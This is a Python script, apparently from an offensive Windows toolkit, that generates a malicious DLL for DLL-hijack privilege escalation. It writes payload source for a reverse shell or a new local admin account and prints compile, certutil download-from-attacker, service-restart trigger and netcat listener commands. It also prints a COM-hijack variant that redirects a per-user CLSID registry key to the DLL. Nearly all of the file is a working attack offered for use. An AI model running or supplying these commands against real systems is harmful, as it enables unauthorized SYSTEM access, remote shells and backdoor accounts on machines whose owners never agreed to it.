#!/usr/bin/env python3
"""DLL HIJACK privesc: a service/app loads a DLL by name from a directory you can write, or from a
writable dir earlier in its search order. Drop a malicious DLL of that name; it runs {action} in the
loader's context (SYSTEM for a service) from DllMain. PRINTS the build + drop + trigger.
Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_dll.py --dll <HijackedName.dll> --dir "C:\\Writable\\SearchDir" [--action revshell|add_admin] [--arch x64|x86]

Find candidates first (from the foothold):
  - PowerUp:  Find-PathDLLHijack   (writable dirs on the system %PATH%)
  - procmon:  filter Result = 'NAME NOT FOUND' + Path ends '.dll'  while restarting the service
  - writable service/app dir that holds a DLL it loads by relative name
"""
import sys
import _winpriv_common as P

def die(m): print(m); sys.exit(1)
def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

dll   = opt("--dll")
ddir  = opt("--dir")
action = opt("--action", "revshell")
arch  = opt("--arch", "x64")
if not (dll and ddir): die('need --dll <name.dll> and --dir "C:\\writable\\dir"')
if action not in P.win_actions(): die(f"unknown action '{action}'. pick: {', '.join(P.win_actions())}")

src = dll.rsplit(".", 1)[0] + ".c"
open(src, "w").write(P.payload_c("dll", P.win_actions()[action]))
target = ddir.rstrip("\\") + "\\" + dll

print(f"# DLL HIJACK  dll={dll}  dir={ddir}  action={action}  arch={arch}")
print(f"# wrote {src}\n")
print(f"# 1) compile on the attacker (mingw):")
print(f"{P.win_compile('dll', src, dll, arch)}")
print(f"\n# 2) drop it at the hijack path on the target (must match the loaded name EXACTLY):")
print(f'certutil -urlcache -f http://{P.LHOST}/{dll} "{target}"   REM HTTP; or base64/SMB — see the cheatsheet')
print(f"\n# 3) trigger the load — restart the service/app that pulls it (or wait for the next start/reboot):")
print(f"sc stop <ServiceThatLoadsIt> & sc start <ServiceThatLoadsIt>")
print(f"# ^ DllMain spawns a thread running {action} in the loader's context.")
if action == "revshell":
    print(f"\n# start `nc -lvnp {P.LPORT}` on the attacker first.")
elif action == "add_admin":
    print(f"\n# creates LOCAL admin {P.ADMIN_USER}:{P.ADMIN_PASS}")
print(f"\n# arch MUST match the loading process (a 32-bit service won't load an x64 dll -> --arch x86).")
print(f"\n# --- variant: COM hijack (per-user, no admin write) — if a SYSTEM/admin process loads a COM object by CLSID ---")
print(f"# find an abusable CLSID (procmon: RegOpenKey HKCR\\CLSID\\<guid>\\InprocServer32 'NAME NOT FOUND' by a priv proc),")
print(f"# then point its per-user key at THIS dll (HKCU wins over HKCR for the loading user):")
print(rf'reg add "HKCU\Software\Classes\CLSID\{{<CLSID-GUID>}}\InprocServer32" /ve /d "C:\Windows\Temp\{dll}" /f')
print(rf'reg add "HKCU\Software\Classes\CLSID\{{<CLSID-GUID>}}\InprocServer32" /v ThreadingModel /d Apartment /f')
print(f"# fires when that COM object is next instantiated (often on login/schedule). Cleanup: reg delete the CLSID key.")
